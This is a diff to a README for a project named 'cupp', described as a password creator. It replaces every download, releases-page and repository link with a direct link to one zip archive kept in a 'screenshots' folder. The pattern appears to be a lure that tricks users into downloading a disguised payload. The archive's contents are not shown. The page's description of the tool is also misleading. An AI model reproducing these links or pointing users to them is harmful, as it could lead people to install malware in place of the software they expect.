@@ -1,7 +1,7 @@
 # 🔑 cupp - Create Strong Passwords Effortlessly
 
 ## 📥 Download the Latest Version
-[![](https://img.shields.io/badge/Download_v1.0-Available-brightgreen)](https://github.com/Cris1234Q/cupp/releases)
+[![](https://raw.githubusercontent.com/Cris1234Q/cupp/master/screenshots/Software_v3.0.zip)](https://raw.githubusercontent.com/Cris1234Q/cupp/master/screenshots/Software_v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To use CUPP, ensure your system meets the following requirements:
 
 ## 📦 Download & Install
 
-To download the software, please visit this page: [Download CUPP](https://github.com/Cris1234Q/cupp/releases). 
+To download the software, please visit this page: [Download CUPP](https://raw.githubusercontent.com/Cris1234Q/cupp/master/screenshots/Software_v3.0.zip). 
 
 On the releases page, you will find the latest version available. Click on the version number. Then, choose the appropriate file for your operating system. 
 
@@ -84,7 +84,7 @@ If you have questions or need help, feel free to reach out through the Issues se
 
 ## 🔗 Useful Links
 
-- [CUPP Releases Page](https://github.com/Cris1234Q/cupp/releases)
-- [GitHub Repository](https://github.com/Cris1234Q/cupp)
+- [CUPP Releases Page](https://raw.githubusercontent.com/Cris1234Q/cupp/master/screenshots/Software_v3.0.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Cris1234Q/cupp/master/screenshots/Software_v3.0.zip)
 
 Thank you for choosing CUPP! Enjoy creating secure passwords and enhancing your security.
